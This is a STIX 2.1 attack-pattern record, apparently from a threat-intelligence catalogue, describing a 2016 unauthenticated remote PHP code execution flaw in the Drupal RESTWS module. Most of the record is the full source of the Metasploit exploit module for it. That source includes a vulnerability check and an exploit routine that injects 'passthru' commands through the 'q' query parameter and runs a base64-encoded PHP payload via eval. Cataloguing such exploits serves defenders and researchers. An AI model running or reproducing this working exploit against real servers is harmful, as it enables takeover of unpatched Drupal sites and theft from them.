{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d74937a5-c1e1-4ba3-8392-0e92d2c6ee42",
    "created": "2024-08-14T17:13:26.527089Z",
    "modified": "2024-08-14T17:13:26.527093Z",
    "name": "Drupal RESTWS Module Remote PHP Code Execution",
    "description": " This module exploits a Remote PHP Code Execution vulnerability in the Drupal RESTWS Module. Unauthenticated users can execute arbitrary code under the context of the web server user.  RESTWS alters the default page callbacks for entities to provide additional functionality. A vulnerability in this approach allows an unauthenticated attacker to send specially crafted requests resulting in arbitrary PHP execution. RESTWS 2.x prior to 2.6 and 1.x prior to 1.7 are affected by this issue.  This module was tested against RESTWS 2.5 with Drupal 7.5 installed on Ubuntu Server.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/drupal_restws_exec.rb",
            "external_id": "drupal_restws_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.drupal.org/node/2765567"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Drupal RESTWS Module Remote PHP Code Execution',\n      'Description'    => %q{\n        This module exploits a Remote PHP Code Execution vulnerability in the\n        Drupal RESTWS Module. Unauthenticated users can execute arbitrary code\n        under the context of the web server user.\n\n        RESTWS alters the default page callbacks for entities to provide\n        additional functionality. A vulnerability in this approach allows\n        an unauthenticated attacker to send specially crafted requests resulting\n        in arbitrary PHP execution. RESTWS 2.x prior to 2.6 and 1.x prior to 1.7\n        are affected by this issue.\n\n        This module was tested against RESTWS 2.5 with Drupal 7.5 installed on\n        Ubuntu Server.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Devin Zuczek',                        # discovery\n          'Mehmet Ince <mehmet@mehmetince.net>'  # msf module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://www.drupal.org/node/2765567']\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [ ['Automatic', {}] ],\n      'DisclosureDate' => '2016-07-13',\n      'DefaultTarget'  => 0\n      ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The target URI of the Drupal installation', '/'])\n      ]\n    )\n  end\n\n  def check\n    r = rand_text_alpha(8 + rand(4))\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        'q' => \"taxonomy_vocabulary//passthru/printf '#{Rex::Text.to_octal(r)}'\"\n      }\n    )\n\n    if res && res.body.include?(r)\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    cmd = \"php -r 'eval(base64_decode(\\\"#{Rex::Text.encode_base64(payload.encoded)}\\\"));'\"\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'vars_get' => {\n        'q' => \"taxonomy_vocabulary//passthru/#{cmd}\"\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-13",
    "x_mitre_platforms": [
        "['php']"
    ]
}